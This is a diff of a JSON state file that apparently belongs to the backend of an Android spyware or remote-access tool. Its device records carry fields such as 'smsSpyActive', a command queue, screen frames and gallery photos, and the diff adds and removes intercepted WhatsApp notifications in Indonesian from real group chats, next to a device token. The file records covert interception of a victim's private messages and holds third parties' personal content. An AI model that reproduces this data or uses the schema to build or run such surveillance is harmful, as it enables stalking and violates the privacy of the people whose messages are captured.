@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042888327,
+    "lastSeen": 1775042891349,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12668 pesan): ~ .",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "01/04 19:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042892214
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14921 pesan dari 9 chat",
+        "time": "01/04 19:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042890286
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12667 pesan): ~ Bot",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:19",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042346472
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14791 pesan dari 10 chat",
-        "time": "01/04 19:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042345487
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14790 pesan dari 10 chat",
-        "time": "01/04 19:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042344207
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14921 pesan dari 9 chat",
+        "time": "01/04 19:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042890273
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12667 pesan): ~ Bot",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:19",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042345464
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12493 pesan): ~ 趙雨凡🌼",
-        "content": "salah jawabannya gajah",
-        "time": "01/04 19:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042344247
       }
     ],
     "galleryPhotos": [],
